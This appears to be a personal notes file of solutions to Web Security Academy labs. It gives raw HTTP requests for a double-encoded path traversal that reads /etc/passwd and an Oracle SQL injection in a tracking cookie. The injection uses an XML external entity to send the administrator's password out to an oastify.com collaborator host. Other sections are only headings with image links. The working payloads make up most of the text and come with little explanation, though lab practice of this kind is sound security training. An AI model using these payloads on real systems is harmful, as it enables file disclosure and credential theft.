
# File Path Traversal 
```
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/2
Host: 0adc00d40408ea3e8149342c005200a2.web-security-academy.net
Accept-Encoding: gzip, deflate, br
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: session=Lq3OHCcEjucWul7dHmq1SL6srchsIa9X
Referer: https://0adc00d40408ea3e8149342c005200a2.web-security-academy.net/
Sec-Ch-Ua: "Chromium";v="138", "Not;A=Brand";v="24", "Google Chrome";v="138"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
```
# SQL Injection
```
GET / HTTP/2
Host: 0ae600a103624d4280490da600f0004e.web-security-academy.net
Cookie: TrackingId=KoXDjIwwyDY3Pvtx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.usqd25h8gc8g989ruxergug8izoqcg05.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=JY9JfX4Y1eQ0fas0Ov61pLGk4ya7Qupg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae600a103624d4280490da600f0004e.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
The payload is:
```
<ccokie-value>' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.usqd25h8gc8g989ruxergug8izoqcg05.oastify.com/"> %remote;]>'),'/l') FROM dual--;
```
![[file-20250806114902816.png]]
# Reflected XSS into a JavaScript string with single quote and backslash escaped
![[file-20250806114541557.png]]

# Web cache poisoning with an unkeyed cookie
![[file-20250806115232215.png]]
![[file-20250806115446948.png]]


